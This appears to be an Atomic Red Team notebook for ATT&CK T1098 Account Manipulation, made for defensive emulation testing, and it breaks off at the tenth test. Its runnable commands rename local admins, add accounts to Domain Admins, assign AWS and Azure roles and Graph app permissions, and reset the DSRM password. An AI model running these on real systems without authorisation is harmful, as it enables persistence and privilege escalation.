{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c4cf6c9c",
   "metadata": {},
   "source": "# T1098 - Account Manipulation\nAdversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
  },
  {
   "cell_type": "markdown",
   "id": "68462ecc",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "4529562c",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Admin Account Manipulate",
    "Manipulate Admin Account Name\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        $account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n        $originalDescription = (Get-LocalUser -Name $account).Description\n        Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n        Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n        Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n        }\n    }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "273aa758",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a789391e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}\nforeach($u in $list) {\n  $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\"\n  Set-LocalUser -Name $u.Name -Description $Matches.Description\n  Rename-LocalUser -Name $u.Name -NewName $Matches.Name\n  Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d436249",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1a9fa74f",
   "metadata": {},
   "source": "### Atomic Test #2 - Domain Account and Group Manipulate\nCreate a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: PS Module ActiveDirectory\n\n##### Check Prereq Commands:\n```powershell\nTry {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n\n```\n##### Get Prereq Commands:\n```powershell\nif((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9db28480",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "99c35ec2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"atr--$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False \nAdd-ADGroupMember \"Domain Admins\" $account\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d205d623",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "414be762",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-ADUser -LDAPFilter \"(&(samaccountname=atr--*)(givenName=Test))\" | Remove-ADUser -Confirm:$False\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "059e05a5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "de83ae5f",
   "metadata": {},
   "source": "### Atomic Test #3 - AWS - Create a group and add a user to that group\nAdversaries create AWS group, add users to specific to that group to elevate their privilieges to gain more accesss\n\n**Supported Platforms:** iaas:aws\n#### Dependencies:  Run with `sh`!\n##### Description: Check if the user exists, we can only add a user to a group if the user exists.\n\n##### Check Prereq Commands:\n```sh\naws iam list-users | grep atomicredteam\n\n```\n##### Get Prereq Commands:\n```sh\necho Please run atomic test T1136.003, before running this atomic test\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f91dde9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a27d8891",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws iam create-group --group-name atomicredteam\naws iam add-user-to-group --user-name atomicredteam --group-name atomicredteam\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70d089ad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "8d97f05e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\naws iam remove-user-from-group --user-name atomicredteam --group-name atomicredteam\naws iam delete-group --group-name atomicredteam\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10831f2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "54928e65",
   "metadata": {},
   "source": "### Atomic Test #4 - Azure AD - adding user to Azure AD role\nThe adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47b14c45",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a183ab4f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce419b14",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "097540b6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17b651db",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "72ce5876",
   "metadata": {},
   "source": "### Atomic Test #5 - Azure AD - adding service principal to Azure AD role\nThe adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f81ae6f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "db56da9b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd6748c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "214178ea",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dc5e314",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "db70bfe5",
   "metadata": {},
   "source": "### Atomic Test #6 - Azure - adding user to Azure role in subscription\nThe adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n\n**Supported Platforms:** iaas:azure\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Az.Resources module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name Az.Resources -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca80213e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "cf3d9392",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0d3246f0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "c5436adc",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a1ccdd9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5823f363",
   "metadata": {},
   "source": "### Atomic Test #7 - Azure - adding service principal to Azure role in subscription\nThe adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n\n**Supported Platforms:** iaas:azure\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Az.Resources module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name Az.Resources -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31f2bb24",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "aff3cb01",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e48b1243",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "3dff8f33",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0f79b1d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0190ee7e",
   "metadata": {},
   "source": "### Atomic Test #8 - Azure AD - adding permission to application\nThe adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db2f0af8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9ed65ffc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"test_app\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq 'test_app'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('DirectoryRecommendations.Read.All')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e66d6609",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "cb4265b8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nImport-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq 'test_app'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name 'test_app': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "61c9b313",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2035a785",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Password Change on Directory Service Restore Mode (DSRM) Account",
    "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a3eaf2a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "3f96dce1",
   "metadata": {},
   "source": "### Atomic Test #10 - Domain Password Policy Check: Short Password\nAttempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Password for current user must be stored in a credential file\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7f870ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1098 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6d9298dc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
